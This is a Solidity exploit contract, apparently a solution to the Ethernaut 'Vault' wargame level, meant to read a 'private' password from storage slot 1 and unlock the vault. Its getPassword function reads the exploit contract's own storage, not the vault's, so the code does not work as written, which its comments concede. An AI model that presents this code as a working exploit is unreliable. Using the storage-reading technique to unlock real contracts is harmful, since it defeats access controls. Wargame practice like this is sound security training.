// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title VaultExploit
 * @notice Exploits Ethernaut Level 08: Vault
 * @dev Reads "private" storage to unlock the vault
 */
contract VaultExploit {
    
    address public vault;
    
    constructor(address _vault) {
        vault = _vault;
    }
    
    /**
     * @notice Exploit function â€” reads slot 1 and unlocks
     * @dev In production, you'd just use cast. This shows the principle.
     */
    function exploit() external {
        // Read password from storage slot 1
        bytes32 password = getPassword();
        
        // Call unlock on vault
        (bool success, ) = vault.call(
            abi.encodeWithSignature("unlock(bytes32)", password)
        );
        
        require(success, "Unlock failed");
    }
    
    /**
     * @notice Reads the "private" password from storage
     * @return password The bytes32 password stored at slot 1
     */
    function getPassword() public view returns (bytes32) {
        // In real exploit, use: cast storage <address> 1
        // This contract version is for demonstration
        bytes32 password;
        assembly {
            // Note: This doesn't work across contracts in Solidity
            // Real exploit uses external storage read
            password := sload(0x01)
        }
        return password;
    }
}

/**
 * @notice Interface for the Vault contract
 */
interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}
